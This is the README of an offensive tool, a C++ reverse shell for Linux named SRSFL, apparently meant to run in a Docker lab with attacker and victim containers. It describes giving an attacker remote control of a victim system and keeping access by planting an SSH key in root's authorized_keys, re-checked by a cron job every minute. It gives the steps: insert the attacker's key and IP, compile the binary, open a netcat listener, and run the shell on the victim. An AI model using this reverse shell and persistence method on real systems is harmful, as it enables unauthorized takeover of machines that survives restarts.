# SRSFL
Simple Reverse Shell For Linux written is a minimalist yet powerful tool designed for remote access to Linux systems. Written in C++.

* Reverse Shell: SRSFL enables remote access to a target Linux system by establishing a reverse shell connection. This allows an attacker to control the victim system remotely.

* Persistence: SRSFL ensures persistence on the target system by adding an SSH key to the root user's authorized_keys file and checking its existence every minute using a cronjob. This ensures that even if the system is restarted, the attacker can regain access without the need for manual intervention.

### Setup:

(`docker-compose up -d`)

### Instruction:

(`./setup.sh`) to insert attacker ssh key and ip.

(`make`) to compile the reverse shell binary.

(`docker exec -it attacker_container /bin/bash`) to get shell on attack container.


(`nc -lvp 1234`) to enable the listener.

(`docker exec -it victim_container /bin/bash`) to get shell on victim container.

(`cd code; ./reverseShell`) - to run reverse shell.
